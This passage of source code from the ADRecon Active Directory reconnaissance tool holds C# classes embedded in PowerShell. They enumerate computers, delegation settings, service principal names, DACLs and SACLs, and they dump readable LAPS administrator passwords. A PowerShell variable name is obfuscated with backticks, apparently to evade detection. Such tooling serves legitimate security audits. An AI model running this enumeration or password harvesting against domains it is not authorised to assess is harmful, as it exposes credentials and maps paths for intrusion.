                    string gPLink = Convert.ToString(AdSOM.Members["gPLink"].Value);
                    string GPOName = null;

                    Depth = (Convert.ToString(AdSOM.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1;
                    if (AdSOM.Members["gPOptions"].Value != null && (int) AdSOM.Members["gPOptions"].Value == 1)
                    {
                        BlockInheritance = true;
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = ADWSClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? ADWSClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdPrinter = (PSObject) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Members["Name"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Members["serverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["printShareName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Members["driverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Members["driverVersion"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["portName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["url"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Members["whenCreated"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Members["whenChanged"].Value));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    bool Dormant = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    string SIDHistory = "";
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Members["LastLogonDate"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdComputer.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdComputer.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) AdComputer.Members["TrustedForDelegation"].Value) && ((int) AdComputer.Members["primaryGroupID"].Value == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Members["msDS-AllowedToDelegateTo"] != null)
                    {
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["msDS-AllowedToDelegateTo"].Value;
                        if (delegateto.Value != null)
                        {
                            DelegationType = "Constrained";
                            foreach (var value in delegateto)
                            {
                                DelegationServices = DelegationServices + "," + Convert.ToString(value);
                            }
                            DelegationServices = DelegationServices.TrimStart(',');
                        }
                    }
                    if ((bool) AdComputer.Members["TrustedToAuthForDelegation"].Value)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["SIDHistory"].Value;
                    string sids = "";
                    foreach (var value in history)
                    {
                        sids = sids + "," + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(',');
                    string OperatingSystem = CleanString((AdComputer.Members["OperatingSystem"].Value != null ? AdComputer.Members["OperatingSystem"].Value : "-") + " " + AdComputer.Members["OperatingSystemHotfix"].Value + " " + AdComputer.Members["OperatingSystemServicePack"].Value + " " + AdComputer.Members["OperatingSystemVersion"].Value);

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdComputer.Members["SamAccountName"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("Name", CleanString(AdComputer.Members["Name"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", AdComputer.Members["DNSHostName"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", AdComputer.Members["Enabled"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", AdComputer.Members["IPv4Address"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", AdComputer.Members["primaryGroupID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", AdComputer.Members["SID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", CleanString(AdComputer.Members["Description"].Value)));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", AdComputer.Members["ms-ds-CreatorSid"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", AdComputer.Members["UserAccountControl"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Members["whenCreated"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Members["whenChanged"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Members["DistinguishedName"].Value));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["servicePrincipalName"].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in SPNs)
                    {
                        bool flag = true;
                        string[] SPNArray = SPN.Split('/');
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = string.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("UserName", CleanString(AdComputer.Members["SamAccountName"].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", CleanString(AdComputer.Members["Name"].Value)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    bool? Enabled = null;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdComputer.Members["userAccountControl"].Value != null)
                    {
                        var userFlags = (UACFlags) AdComputer.Members["userAccountControl"].Value;
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    try
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Members["ms-Mcs-AdmPwdExpirationTime"].Value));
                        PasswordStored = true;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Members["DNSHostName"].Value != null ? AdComputer.Members["DNSHostName"].Value : AdComputer.Members["CN"].Value )));
                    LAPSObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Members["ms-Mcs-AdmPwd"].Value != null ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", AdComputer.Members["ms-Mcs-AdmPwd"].Value));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    switch (Convert.ToString(AdObject.Members["ObjectClass"].Value))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            ADWSClass.AdSIDDictionary.Add(Convert.ToString(AdObject.Members["objectsid"].Value), Convert.ToString(AdObject.Members["Name"].Value));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", ADWSClass.AdSIDDictionary.ContainsKey(IdentityReference) ? ADWSClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", ADWSClass.AdSIDDictionary.ContainsKey(Owner) ? ADWSClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Members["DistinguishedName"].Value));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
"@

${ld`APSoUR`CE} = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Net;
using System.Threading;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class LDAPClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum GroupTypeFlags
        {
            GLOBAL_GROUP       = 2,            // 0x00000002
            DOMAIN_LOCAL_GROUP = 4,            // 0x00000004
            LOCAL_GROUP        = 4,            // 0x00000004
            UNIVERSAL_GROUP    = 8,            // 0x00000008
            SECURITY_ENABLED   = -2147483648   // 0x80000000
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, "DomainControllers");
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, "SchemaHistory");
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "GroupChanges");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            LDAPClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            LDAPClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            LDAPClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
